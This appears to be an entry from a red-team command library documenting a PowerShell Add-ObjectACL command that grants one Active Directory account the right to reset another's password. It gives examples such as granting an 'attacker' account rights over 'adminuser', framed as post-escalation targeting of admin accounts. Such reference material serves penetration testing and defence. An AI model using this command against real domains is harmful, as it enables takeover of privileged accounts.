---
id: c491df2a-a440-49d5-ae88-d966131d4832
type: command
executor: powershell
data: >-
  Add-ObjectACL -TargetSamAccountName $_TARGET_ACCOUNT -PrincipalSamAccountName
  $_PRINCIPAL_ACCOUNT -Rights ResetPassword
output: null
created_at: '2023-04-06T03:56:06.430393+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - active-directory
  - password-reset
  - acl-modification
verified: true
validated: true
---

# grant-reset-password-right-on-user

## Command

```powershell
Add-ObjectACL -TargetSamAccountName $_TARGET_ACCOUNT -PrincipalSamAccountName $_PRINCIPAL_ACCOUNT -Rights ResetPassword
```

## Description

Grants a principal the right to reset the password of a target user account. Useful post-escalation for targeting admin accounts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -TargetSamAccountName | SAM name of the user whose password can be reset | Yes |
| -PrincipalSamAccountName | SAM name of the account gaining the right | Yes |
| -Rights | Specific right (ResetPassword) | Yes |

## Examples

### Basic Usage

```powershell
Add-ObjectACL -TargetSamAccountName toto -PrincipalSamAccountName titi -Rights ResetPassword
```

### Advanced Usage

```powershell
Add-ObjectACL -TargetSamAccountName adminuser -PrincipalSamAccountName attacker -Rights ResetPassword
```

## Expected Output

Command completes without error: "ResetPassword right granted to titi on toto." Verify with Get-ACL.

## Related

- [[procedures/Abuse-AdminSDHolder-for-Privilege-Escalation]]
